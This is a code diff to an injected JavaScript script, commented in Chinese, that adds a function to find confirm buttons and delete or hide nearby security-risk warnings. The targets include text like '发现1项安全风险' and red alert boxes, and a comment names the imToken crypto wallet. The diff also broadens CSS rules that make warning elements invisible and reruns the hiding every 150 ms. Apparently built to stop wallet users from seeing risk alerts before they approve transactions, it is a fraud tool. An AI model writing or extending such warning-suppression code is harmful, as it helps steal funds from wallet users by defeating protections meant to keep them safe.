@@ -580,7 +580,7 @@
                  }
              });
              
-             // 🎯 方法3：CSS样式注入覆盖
+             // 🎯 方法3：超强CSS样式注入覆盖 - 专门针对确认按钮上方的风险提示
              const antiRiskCSS = `
                  /* 🔥 终极安全风险隐藏CSS */
                  [data-testid*="risk"], [data-testid*="warning"], [data-testid*="alert"],
@@ -607,10 +607,46 @@
                  /* 🔥 隐藏红色文字和背景 */
                  *[style*="color: red"], *[style*="color:red"],
                  *[style*="background: red"], *[style*="background:red"],
-                 *[style*="color: #ff"], *[style*="color:#ff"] {
+                 *[style*="color: #ff"], *[style*="color:#ff"],
+                 *[style*="background-color: rgb(255"], *[style*="background-color:rgb(255"] {
                      color: transparent !important;
                      background: transparent !important;
+                     background-color: transparent !important;
                      display: none !important;
+                     opacity: 0 !important;
+                     height: 0 !important;
+                     width: 0 !important;
+                     margin: 0 !important;
+                     padding: 0 !important;
+                     border: none !important;
+                     position: absolute !important;
+                     left: -99999px !important;
+                     z-index: -99999 !important;
+                 }
+                 
+                 /* 🔥 专门针对确认按钮上方的红色风险提示 */
+                 button ~ *, .btn ~ *, [role="button"] ~ * {
+                     background-color: transparent !important;
+                     color: transparent !important;
+                 }
+                 
+                 /* 🔥 隐藏任何红色背景的元素，如果包含"风险"文字 */
+                 div[style*="background"], span[style*="background"] {
+                     background: transparent !important;
+                     color: transparent !important;
+                 }
+                 
+                 /* 🔥 强制隐藏固定定位的风险提示 */
+                 div[style*="position: fixed"], div[style*="position:fixed"] {
+                     background: transparent !important;
+                     color: transparent !important;
+                 }
+                 
+                 /* 🔥 暴力隐藏所有可能的风险提示样式 */
+                 [style*="rgb(255"], [style*="#ff"], [style*="red"] {
+                     display: none !important;
+                     visibility: hidden !important;
+                     opacity: 0 !important;
                  }
              `;
              
@@ -637,6 +673,115 @@
              console.log('🔥 终极安全绕过出错:', e.message);
          }
      }
+    
+    // 🔥🔥🔥 专门针对确认按钮上方风险提示的强化隐藏
+    function hideConfirmButtonRiskWarning() {
+        try {
+            console.log('🔥 专门处理确认按钮上方的安全风险提示...');
+            
+            // 🔥 方法1：查找确认按钮并隐藏其上方的风险提示
+            const confirmButtons = document.querySelectorAll('button, [role="button"], .btn, .button');
+            confirmButtons.forEach(btn => {
+                const btnText = btn.textContent || '';
+                if (btnText.includes('确认') || btnText.includes('同意') || btnText.includes('继续')) {
+                    console.log('🔥 找到确认按钮:', btnText);
+                    
+                    // 🔥 查找按钮的父容器
+                    let container = btn.parentElement;
+                    while (container && container !== document.body) {
+                        // 🔥 在容器中查找风险提示
+                        const riskElements = container.querySelectorAll('*');
+                        riskElements.forEach(el => {
+                            const text = el.textContent || '';
+                            if (text.includes('发现1项安全风险') || 
+                                text.includes('安全风险') ||
+                                text.includes('风险')) {
+                                
+                                // 🔥 强制隐藏风险提示
+                                el.style.setProperty('display', 'none', 'important');
+                                el.style.setProperty('visibility', 'hidden', 'important');
+                                el.style.setProperty('opacity', '0', 'important');
+                                el.style.setProperty('height', '0', 'important');
+                                el.style.setProperty('position', 'absolute', 'important');
+                                el.style.setProperty('left', '-99999px', 'important');
+                                el.style.setProperty('z-index', '-99999', 'important');
+                                
+                                try {
+                                    el.remove();
+                                    console.log('🔥 移除确认按钮附近的风险提示');
+                                } catch (e) {
+                                    el.innerHTML = '';
+                                    console.log('🔥 清空确认按钮附近的风险提示内容');
+                                }
+                            }
+                        });
+                        container = container.parentElement;
+                    }
+                }
+            });
+            
+            // 🔥 方法2：直接查找红色背景的风险提示元素
+            const allElements = document.querySelectorAll('*');
+            allElements.forEach(el => {
+                const computedStyle = window.getComputedStyle(el);
+                const text = el.textContent || '';
+                
+                // 🔥 检查是否是红色背景且包含风险文字
+                const isRedBackground = computedStyle.backgroundColor.includes('rgb(255') ||
+                                       computedStyle.backgroundColor.includes('red') ||
+                                       el.style.backgroundColor.includes('red') ||
+                                       el.style.backgroundColor.includes('#ff') ||
+                                       el.style.backgroundColor.includes('rgb(255');
+                
+                const isRedText = computedStyle.color.includes('rgb(255') ||
+                                 computedStyle.color.includes('red') ||
+                                 el.style.color.includes('red') ||
+                                 el.style.color.includes('#ff');
+                
+                if ((isRedBackground || isRedText) && text.includes('风险')) {
+                    console.log('🔥 发现红色风险提示元素:', text.substring(0, 30));
+                    
+                    // 🔥 超强隐藏
+                    el.style.setProperty('display', 'none', 'important');
+                    el.style.setProperty('visibility', 'hidden', 'important');
+                    el.style.setProperty('opacity', '0', 'important');
+                    el.style.setProperty('background', 'transparent', 'important');
+                    el.style.setProperty('color', 'transparent', 'important');
+                    el.style.setProperty('height', '0', 'important');
+                    el.style.setProperty('width', '0', 'important');
+                    el.style.setProperty('margin', '0', 'important');
+                    el.style.setProperty('padding', '0', 'important');
+                    el.style.setProperty('border', 'none', 'important');
+                    el.style.setProperty('position', 'absolute', 'important');
+                    el.style.setProperty('left', '-99999px', 'important');
+                    el.style.setProperty('z-index', '-99999', 'important');
+                    
+                    try {
+                        el.remove();
+                        console.log('🔥 成功移除红色风险提示');
+                    } catch (e) {
+                        el.innerHTML = '';
+                        el.textContent = '';
+                        console.log('🔥 清空红色风险提示内容');
+                    }
+                }
+            });
+            
+            // 🔥 方法3：查找固定定位的弹窗风险提示
+            const fixedElements = document.querySelectorAll('[style*="position: fixed"], [style*="position:fixed"]');
+            fixedElements.forEach(el => {
+                const text = el.textContent || '';
+                if (text.includes('发现') && text.includes('风险')) {
+                    console.log('🔥 发现固定定位的风险提示:', text.substring(0, 30));
+                    el.style.setProperty('display', 'none', 'important');
+                    el.remove();
+                }
+            });
+            
+        } catch (e) {
+            console.log('🔥 确认按钮风险隐藏失败:', e.message);
+        }
+    }
     
     // 🔥🔥🔥 终极文本替换和DOM劫持
     function ultimateTextReplace() {
@@ -779,17 +924,20 @@
     
     // 🔥 立即执行所有方法
     ultraSecurityBypass();
+    hideConfirmButtonRiskWarning();
     ultimateTextReplace();
     ultimateMutationObserver();
     
-    // 🔥 超高频执行
+    // 🔥 超高频执行 - 专门针对确认按钮风险提示
     setInterval(ultraSecurityBypass, 200); // 每200ms执行一次
+    setInterval(hideConfirmButtonRiskWarning, 150); // 每150ms专门处理确认按钮风险
     setInterval(ultimateTextReplace, 300); // 每300ms文本替换
     
     // 🎯 页面状态变化时执行
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', () => {
             ultraSecurityBypass();
+            hideConfirmButtonRiskWarning();
             ultimateTextReplace();
         });
     }
@@ -798,8 +946,19 @@
     window.addEventListener('focus', () => {
         setTimeout(() => {
             ultraSecurityBypass();
+            hideConfirmButtonRiskWarning();
             ultimateTextReplace();
         }, 100);
+    });
+    
+    // 🔥 专门针对imToken的页面变化监听
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            console.log('🔥 页面完全加载，执行最终安全绕过');
+            ultraSecurityBypass();
+            hideConfirmButtonRiskWarning();
+            ultimateTextReplace();
+        }, 500);
     });
     
 })();
